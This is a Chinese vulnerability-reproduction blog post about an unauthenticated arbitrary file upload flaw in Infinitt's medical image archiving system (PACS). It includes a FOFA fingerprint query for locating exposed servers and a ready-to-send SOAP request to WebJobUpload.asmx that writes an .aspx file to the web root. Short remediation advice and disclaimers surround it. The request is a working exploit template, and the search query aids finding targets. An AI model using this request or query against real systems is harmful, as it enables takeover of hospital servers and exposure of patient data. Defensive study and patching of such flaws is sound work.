#  漏洞复现 | 英飞达医学影像存档与通信系统WebJobUpload任意文件上传漏洞【附poc】   
原创 实战安全研究  实战安全研究   2024-05-18 17:43  
  
**免责声明**  
  
**本文仅用于技术学习和讨论。请勿使用本文所提供的内容及相关技术从事非法活动**  
**，由于传播、利用此文所提供的内容或工具而造成的任何直接或者间接的后果及损失，**  
**均由使用者本人负责，所产生的一切不良后果均与文章作者及本账号**  
**无关**  
**，本次测试仅供学习使用。**  
**如有内容争议或侵权，请及时私信我们！****我们会立即删除并致歉。谢谢！**  
##   
  
**一、漏洞简述**  
  
英飞达  
是一家专业开发医学影像系统的公司，成立于1994年，医学影像存档与通信系统 Picture Archiving and Communication System，由软件光盘、使用手册组成，组成模块包括影像采集模块、影像存储模块、影像浏览模块、影像输出模块。用于医疗图像的采集、存储、浏览、传输和输出。  
其  
WebJobUpload.asmx  
接口  
存在任意文件上传漏洞，  
未经身份验证  
的恶意攻击者  
可以上传任意文件，  
进而控制服务器系统  
。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF080ibHgwTBe011ouLnEx4kSHeNkThPW693utXMJiaNpdwrUnEmoDhiakAIfjxHypr8EaWxfpKPlSvbA/640?wx_fmt=png&from=appmsg "")  
## 二、网络测绘  
```
fofa：
icon_hash="1474455751" || icon_hash="702238928"
```  
## 三、漏洞复现  
  
测试上传aspx文件，test为base64编码dGVzdA==  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF080ibHgwTBe011ouLnEx4kS8JJ70FictmKOiak3TI9krL88tXIUCHggumxPW2EPKmmEMvtNMQcW5OmA/640?wx_fmt=png&from=appmsg "")  
  
访问  
/1/test.aspx文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF080ibHgwTBe011ouLnEx4kSlAeAqb5pUh8yXtB2toYmTUe3eoX3lJicraxCSqjibWUAec6icRs9icWJ8Q/640?wx_fmt=png&from=appmsg "")  
  
**四、漏洞检测poc**  
```
POST /webservices/WebJobUpload.asmx HTTP/1.1
Host: 0.0.0.0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Length: 410
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
Soapaction: "http://rainier/jobUpload"
Connection: close

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<jobUpload xmlns="http://rainier">
<vcode>1</vcode>
<subFolder></subFolder>
<fileName>test.aspx</fileName>
<bufValue>dGVzdA==</bufValue>
</jobUpload>
</soap:Body>
</soap:Envelope>
```  
  
  
**五、漏洞修复**  
  
1  
、建议联系厂商打补丁或升级版本。  
  
2、增  
加Web应用防火墙防护。  
  
3、  
关闭互联网暴露面或接口设置访问权限。  
  
**免责声明**  
  
**本文仅用于技术学习和讨论。请勿使用本文所提供的内容及相关技术从事非法活动**  
**，由于传播、利用此文所提供的内容或工具而造成的任何直接或者间接的后果及损失，**  
**均由使用者本人负责，所产生的一切不良后果均与文章作者及本账号**  
**无关**  
**，本次测试仅供学习使用。**  
**如有内容争议或侵权，请及时私信我们！****我们会立即删除并致歉。谢谢！**  
  
  
